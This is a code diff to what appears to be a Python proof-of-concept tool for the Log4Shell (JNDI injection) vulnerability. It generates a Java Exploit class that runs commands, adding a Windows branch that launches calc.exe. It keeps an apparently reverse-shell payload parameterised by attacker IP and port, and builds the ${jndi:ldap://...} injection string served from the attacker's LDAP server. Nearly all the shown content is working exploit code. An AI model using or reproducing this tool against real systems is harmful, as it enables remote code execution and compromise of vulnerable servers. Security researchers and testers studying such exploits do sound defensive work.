@@ -11,7 +11,33 @@ CUR_FOLDER = Path(__file__).parent.resolve()
 
 
 def generate_payload(userip: str, lport: int) -> None:
-    program = """
+    if os.name == "nt":
+        print(Fore.BLUE + "[!] Running on Windows\n")
+
+        program = """
+public class Exploit {
+    public Exploit() {}
+    static {
+        try {
+            System.out.println("Exploit");
+            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
+                    ? new String[]{"cmd.exe","/c", "calc.exe"}
+                    : new String[]{"open","/System/Applications/Calculator.app"};
+            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] args) {
+        Exploit e = new Exploit();
+    }
+}
+
+"""
+    else:
+        print(Fore.BLUE + "[!] Not running on Windows\n")
+
+        program = """
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -50,6 +76,7 @@ public class Exploit {
         s.close();
     }
 }
+
 """ % (userip, lport)
 
     # writing the exploit to Exploit.java file
@@ -86,18 +113,6 @@ def payload(userip: str, webport: int, lport: int) -> None:
     httpd.serve_forever()
 
 
-def check_java() -> bool:
-    exit_code = subprocess.call(
-        [
-            "java",
-            "-version",
-        ],
-        stderr=subprocess.DEVNULL,
-        stdout=subprocess.DEVNULL,
-    )
-    return exit_code == 0
-
-
 def ldap_server(userip: str, lport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
@@ -112,6 +127,18 @@ def ldap_server(userip: str, lport: int) -> None:
             url,
         ]
     )
+
+
+def check_java() -> bool:
+    exit_code = subprocess.call(
+        [
+            "java",
+            "-version",
+        ],
+        stderr=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+    )
+    return exit_code == 0
 
 
 def main() -> None:
